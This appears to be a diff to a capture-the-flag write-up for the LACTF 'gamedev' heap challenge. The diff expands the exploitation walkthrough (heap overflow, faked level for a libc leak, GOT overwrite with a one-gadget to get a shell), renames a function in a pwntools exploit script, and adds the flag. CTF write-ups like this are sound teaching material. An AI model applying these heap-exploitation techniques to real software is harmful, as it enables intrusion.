@@ -28,12 +28,12 @@ The `curr->data` buffer can only hold 0x20 bytes so we have an overflow of 0x20 
 The overflow should be enough to modify meta data of the following chunk and even overwrite content of it. Moreover we get a `PIE` leak for free just right at the start, so we already know the address of the `GOT`.
 
 # 4. Exploitation<a name="exploitation"></a>
-The only annoying thing about this challenge are the checks that we are not allowed to modify the chunks if the current level is the same as the previous level which can be circumvented by using the `reset` functionality.
+The only annoying thing about this challenge are the checks that we are not allowed to modify the chunks if the current level is the same as the previous level which can be circumvented by using the `reset` functionality to set our current level back to the very first one.
 At first we need a libc leak. This can be done by overwriting one of the `next` pointers of the level struct. As we don't have any leaks yet except for the binary base we need a pointer to libc within the binary itself.
 
 ![gdb-libc-leak-pointer](ctf/writeups/lactf/gamedev/gdb_libc_leak_pointer.png "gdb-libc-leak-pointer")
 
-I chose the pointer to `__libc_start_main`. So by overwriting the `next` pointer with the pointer containing the pointer to `__libc_start_main`, we can traverse the different levels until we are in the faked level and thus can leak the libc. Now we just need to overwrite the `GOT` with a working onegadget and pop a shell.
+I chose the pointer to `__libc_start_main`. So by overwriting the `next` pointer with the pointer containing the pointer to `__libc_start_main`, we can traverse the different levels via the `explore` functionality until we are in the faked level and thus can leak the libc with the `test_level` functionality. Now we just need to overwrite an entry in the `GOT` with a working onegadget by applying the same trick as for the leak and pop a shell.
 
 # 5. Mitigation<a name="mitigation"></a>
 Check the bounds of used buffers and use variables saving these bounds instead of hardcoding magic numbers one by one.
@@ -56,9 +56,7 @@ context.log_level = 'debug'
 ENV_VARS = None
 
 gdbscript = """
-# breakrva 0x1ab5
 set max-visualize-chunk-size 0x100
-break *reset
 continue
 """
 
@@ -120,7 +118,7 @@ def preps(io):
     explore(io, b'1')
     create_level(io, b'0')
 
-def overwrite_got_puts(io, got_addr):
+def overwrite_got(io, got_addr):
     target_entry_got = 7
     got_target = got_addr - (0x8 * 0x8) + (0x8 * target_entry_got)
     reset(io)
@@ -153,7 +151,7 @@ def main():
     libc_base = libc_leak(io, libc_start_main_leak)
     libc.address = libc_base
 
-    overwrite_got_puts(io, got_addr)
+    overwrite_got(io, got_addr)
 
     io.interactive()
     clean_up()
@@ -242,4 +240,4 @@ if __name__ == "__main__":
 ```
 
 # 7. Flag<a name="flag"></a>
-LACTF{???}
+lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P}
